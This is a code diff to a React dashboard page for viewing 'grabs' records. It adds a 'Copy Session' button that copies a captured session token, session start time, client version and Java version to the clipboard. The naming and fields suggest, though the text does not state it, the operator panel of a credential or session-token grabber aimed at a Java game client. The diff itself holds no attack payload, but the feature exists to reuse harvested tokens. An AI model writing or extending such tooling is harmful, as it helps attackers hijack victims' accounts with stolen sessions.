@@ -52,6 +52,7 @@ export default function GrabDetailPage() {
   const [loading, setLoading] = useState(true);
   const [deleting, setDeleting] = useState(false);
   const [copied, setCopied] = useState(false);
+  const [copiedSession, setCopiedSession] = useState(false);
 
   useEffect(() => {
     fetch(`/api/grabs/${params.id}`)
@@ -93,6 +94,18 @@ export default function GrabDetailPage() {
     navigator.clipboard.writeText(lines);
     setCopied(true);
     setTimeout(() => setCopied(false), 2000);
+  };
+
+  const handleCopySession = () => {
+    const lines = [
+      `Session Token: ${grab.session_id || '—'}`,
+      `Session Start: ${grab.session_start || '—'}`,
+      `Client Version: ${grab.client_version || '—'}`,
+      `Java Version: ${grab.java_version || '—'}`,
+    ].join('\n');
+    navigator.clipboard.writeText(lines);
+    setCopiedSession(true);
+    setTimeout(() => setCopiedSession(false), 2000);
   };
 
   const mask = (val) => {
@@ -169,6 +182,9 @@ export default function GrabDetailPage() {
         <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 24 }}>
           <div onClick={() => router.push('/dashboard/grabs')} style={{ cursor: 'pointer', color: colors.textDim, fontSize: 13, display: 'flex', alignItems: 'center', gap: 4, transition: 'color 0.15s' }} onMouseEnter={e => e.target.style.color = colors.text} onMouseLeave={e => e.target.style.color = colors.textDim}>← Back</div>
           <div style={{ display: 'flex', gap: 12 }}>
+            <div onClick={handleCopySession} style={{ cursor: 'pointer', color: copiedSession ? colors.green : colors.textDim, fontSize: 13, transition: 'color 0.15s' }} onMouseEnter={e => e.target.style.color = colors.text} onMouseLeave={e => e.target.style.color = copiedSession ? colors.green : colors.textDim}>
+              {copiedSession ? '✓ Session Copied!' : '🎮 Copy Session'}
+            </div>
             <div onClick={handleCopyAll} style={{ cursor: 'pointer', color: copied ? colors.green : colors.textDim, fontSize: 13, transition: 'color 0.15s' }} onMouseEnter={e => e.target.style.color = colors.text} onMouseLeave={e => e.target.style.color = copied ? colors.green : colors.textDim}>
               {copied ? '✓ Copied!' : '📋 Copy All Data'}
             </div>
